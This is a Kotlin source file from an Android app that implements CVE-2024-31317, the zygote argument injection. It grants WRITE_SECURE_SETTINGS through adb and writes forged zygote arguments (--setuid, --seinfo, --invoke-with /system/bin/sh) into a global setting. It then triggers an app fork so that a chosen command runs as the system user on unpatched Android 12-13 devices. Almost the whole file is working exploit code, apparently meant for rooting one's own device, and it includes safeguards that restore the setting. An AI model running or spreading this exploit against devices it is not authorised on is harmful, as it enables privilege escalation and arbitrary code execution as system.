package com.hexo141.liquidglass.root

import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell

/**
 * CVE-2024-31317: Zygote argument injection, used here as a **prerequisite** rather than a root.
 *
 * ## What this actually gives you
 *
 * It does **not** produce root. It gives code execution inside a process that zygote forks, running
 * as whatever `--setuid=` / `--seinfo=` pair the payload names. In this app the useful target is
 * `system` (`uid=1000`, `u:r:system_app:s0`), because a handful of engines need a privileged caller
 * before they can do anything at all.
 *
 * The mechanism is a settings write plus one app launch:
 *
 * 1. `WRITE_SECURE_SETTINGS` is granted to this app through the shell user (`pm grant`).
 * 2. `Settings.Global.hidden_api_blacklist_exemptions` is set to a payload containing forged zygote
 *    arguments (`--invoke-with`, `--setuid=`, `--seinfo=` and so on).
 * 3. Any app launch makes zygote parse those arguments as its own.
 * 4. The setting is restored immediately.
 *
 * ## Window
 *
 * Only Android 12 through 13 (`S`..`TIRAMISU`) are exploitable through this path, and only on builds
 * whose security patch predates June 2024. Outside that window there is nothing to try, so [probe]
 * answers honestly and the gated engines stay disabled rather than failing after a push.
 *
 * ## The part that has to be right
 *
 * Step 2 writes into a settings key that zygote reads on **every** fork. Leaving a malformed value
 * behind is how a device stops booting, so [inject] restores the previous value in a `finally`
 * block, and [restore] is exposed separately so a caller can force it after a crash. The reference
 * tool resets the key 200 ms later and hopes; this waits for the marker the payload writes and
 * restores regardless of the outcome.
 *
 * Upstream: <https://github.com/wqry085/PoC-Deployer-System>
 */
object Zygote31317 {
    /** The setting zygote reads. Written and restored, never left behind. */
    private const val KEY = "hidden_api_blacklist_exemptions"

    /** Written by the injected payload so success can be observed without guessing. */
    private const val MARKER = "/data/local/tmp/openroot/31317-ok"

    enum class Availability {
        /** The device is in the exploitable window. */
        READY,

        /** Connected, but Android too old or too new for this bug. */
        OUT_OF_WINDOW,

        /** Patch level is new enough that the bug is fixed. */
        PATCHED,

        /** No connection, so nothing could be read. */
        UNKNOWN,
    }

    data class Probe(
        val availability: Availability,
        val sdk: Int,
        val release: String,
        val patchLevel: String,
        val detail: String,
    ) {
        val canInject: Boolean get() = availability == Availability.READY
    }

    /**
     * Reads whether this device is in the window.
     *
     * Both bounds matter: below Android 12 the argument parser is different, and from Android 14 the
     * setting is no longer consulted, so a run there would write a dangerous key and gain nothing.
     */
    fun probe(manager: AbsAdbConnectionManager, log: (String) -> Unit = {}): Probe {
        val command = "getprop ro.build.version.sdk; getprop ro.build.version.release; " +
            "getprop ro.build.version.security_patch"
        log("$ $command")
        val out = runCatching { AdbShell.exec(manager, command) }.getOrDefault("")
        if (out.isNotBlank()) log(out.trimEnd())

        val lines = out.lineSequence().map { it.trim() }.toList()
        val sdk = lines.getOrNull(0)?.toIntOrNull() ?: 0
        val release = lines.getOrNull(1).orEmpty()
        val patch = lines.getOrNull(2).orEmpty()

        val availability = when {
            sdk == 0 -> Availability.UNKNOWN
            sdk < 31 || sdk > 33 -> Availability.OUT_OF_WINDOW
            patch >= "2024-06-01" -> Availability.PATCHED
            else -> Availability.READY
        }
        val detail = when (availability) {
            Availability.READY -> "Android $release (API $sdk), patch $patch: in the window"
            Availability.OUT_OF_WINDOW ->
                "Android $release (API $sdk) is outside the Android 12-13 window this bug covers"
            Availability.PATCHED -> "patch level $patch includes the June 2024 fix"
            Availability.UNKNOWN -> "the build properties could not be read"
        }
        log("<i> $detail")
        return Probe(availability, sdk, release, patch, detail)
    }

    /**
     * Builds the injected argument string for one target identity.
     *
     * Each line is a separate zygote argument, which is why the upstream tool appends `\n` to every
     * token: zygote splits its command line on `.split("\\n")` once this setting is present. A
     * trailing newline on `--invoke-with` matters more than the rest — it is what separates the
     * `sh -c` wrapper from the payload path.
     */
    fun payloadFor(uid: Int, seinfo: String, command: String): String = buildString {
        append("--setuid=\n$uid\n")
        append("--setgid=\n$uid\n")
        append("--runtime-args\n")
        append("--seinfo=\n$seinfo\n")
        append("--invoke-with\n/system/bin/sh $command\n")
    }

    /**
     * Writes the payload, launches the app that triggers a fork, then restores the key.
     *
     * The restore is unconditional. It runs in `finally` so an exception between the write and the
     * launch cannot leave the device carrying a forged zygote argument list.
     *
     * @return `true` when the injected payload left its marker behind
     */
    fun inject(
        manager: AbsAdbConnectionManager,
        uid: Int,
        seinfo: String,
        command: String,
        log: (String) -> Unit = {},
    ): Boolean {
        val probe = probe(manager, log)
        if (!probe.canInject) {
            log("<e> ${probe.detail}")
            return false
        }

        val previous = readKey(manager, log)
        log("<i> current $KEY = '${previous.take(60)}${if (previous.length > 60) "…" else ""}'")

        return try {
            // The shell user holds WRITE_SECURE_SETTINGS, so it can hand it to this app.
            val pkg = appPackage
            if (pkg.isEmpty()) {
                log("<e> the app package name is unknown; cannot grant WRITE_SECURE_SETTINGS")
                return false
            }
            log("$ pm grant $pkg android.permission.WRITE_SECURE_SETTINGS")
            val grant = runCatching {
                AdbShell.exec(manager, "pm grant $pkg android.permission.WRITE_SECURE_SETTINGS 2>&1")
            }.getOrDefault("")
            if (grant.isNotBlank()) log(grant.trimEnd())

            runCatching { AdbShell.exec(manager, "rm -f $MARKER") }
            val payload = payloadFor(uid, seinfo, command)
            if (!writeKey(manager, payload, log)) {
                log("<e> writing $KEY failed; nothing was injected")
                return false
            }
            log("<i> forged zygote arguments written, launching to trigger a fork")

            // Any launch forks through zygote, which is the whole point of the bug.
            val launch = runCatching {
                AdbShell.exec(
                    manager,
                    "am start -n com.android.settings/.Settings 2>&1",
                    20_000L,
                )
            }.getOrDefault("")
            if (launch.isNotBlank()) log(launch.trimEnd())

            // The payload runs inside the forked process, so wait for its marker rather than sleep.
            val marker = runCatching {
                AdbShell.exec(
                    manager,
                    "c=0; until [ -e $MARKER ] || [ \$c -ge 10 ]; do c=\$((c+1)); sleep 1; done; " +
                        "ls -l $MARKER 2>&1; id",
                    20_000L,
                )
            }.getOrDefault("")
            if (marker.isNotBlank()) log(marker.trimEnd())
            val ok = marker.contains(MARKER) && !marker.contains("No such file")
            log(if (ok) "<i> injected payload ran; it wrote $MARKER" else "<e> the marker never appeared")
            ok
        } finally {
            restore(manager, previous, log)
        }
    }

    /** Puts the key back to the value it had before [inject] touched it. */
    fun restore(
        manager: AbsAdbConnectionManager,
        original: String = "",
        log: (String) -> Unit = {},
    ) {
        log("<i> restoring $KEY")
        writeKey(manager, original, log)
    }

    /**
     * Reads the current value through `settings get`.
     *
     * A missing value prints `null`, which is normalised to the empty string so it round-trips.
     */
    private fun readKey(manager: AbsAdbConnectionManager, log: (String) -> Unit): String {
        val out = runCatching {
            AdbShell.exec(manager, "settings get global $KEY 2>&1")
        }.getOrDefault("").trim()
        return if (out == "null" || out.startsWith("Error")) "" else out
    }

    /**
     * Writes the key with `settings put`.
     *
     * `put` is used instead of the reference tool's raw ContentProvider insert because it accepts an
     * arbitrary string without URL-encoding guesswork, and it is what `settings get` reads back.
     */
    private fun writeKey(
        manager: AbsAdbConnectionManager,
        value: String,
        log: (String) -> Unit,
    ): Boolean {
        // Single quotes keep the multi-line payload intact through the shell.
        val escaped = value.replace("'", "'\\''")
        val out = runCatching {
            AdbShell.exec(manager, "settings put global $KEY '$escaped' 2>&1")
        }.getOrDefault("")
        if (out.isNotBlank()) log(out.trimEnd())
        val now = readKey(manager, log)
        return now == value
    }

    /**
     * Package name of this app, needed by `pm grant`.
     *
     * Set once from `MainActivity.onCreate` rather than read from a `Context`, so this object stays
     * usable from the root package without importing `android.content`.
     */
    @Volatile
    var appPackage: String = ""

    /**
     * Grants [WRITE_SECURE_SETTINGS][android.Manifest.permission.WRITE_SECURE_SETTINGS] ahead of time.
     *
     * [inject] does its own grant, so this exists for the gate: a caller can check the permission is
     * held without writing anything into the settings table. Some OEM builds (MIUI, ColorOS,
     * OriginOS) revoke the grant on their own, which is why the answer is read back rather than
     * assumed from the exit code.
     */
    fun grant(manager: AbsAdbConnectionManager, log: (String) -> Unit = {}): Boolean {
        val pkg = appPackage
        if (pkg.isEmpty()) {
            log("<e> the app package name is unknown; cannot grant WRITE_SECURE_SETTINGS")
            return false
        }
        log("$ pm grant $pkg android.permission.WRITE_SECURE_SETTINGS")
        val out = runCatching {
            AdbShell.exec(manager, "pm grant $pkg android.permission.WRITE_SECURE_SETTINGS 2>&1")
        }.getOrDefault("")
        if (out.isNotBlank()) log(out.trimEnd())
        val held = runCatching {
            AdbShell.exec(manager, "dumpsys package $pkg 2>&1 | grep -c WRITE_SECURE_SETTINGS")
        }.getOrDefault("").trim().toIntOrNull() ?: 0
        // A denied grant prints to stderr but still exits 0, so the read-back is the real answer.
        val ok = held > 0
        log(if (ok) "<i> WRITE_SECURE_SETTINGS is held" else "<e> WRITE_SECURE_SETTINGS was not granted")
        return ok
    }

    /**
     * Clears the setting without injecting anything.
     *
     * Exposed so the UI can offer a manual reset if a previous run died at exactly the wrong moment.
     * An empty value is the same state a device ships with.
     */
    fun reset(manager: AbsAdbConnectionManager, log: (String) -> Unit = {}) {
        restore(manager, "", log)
    }
}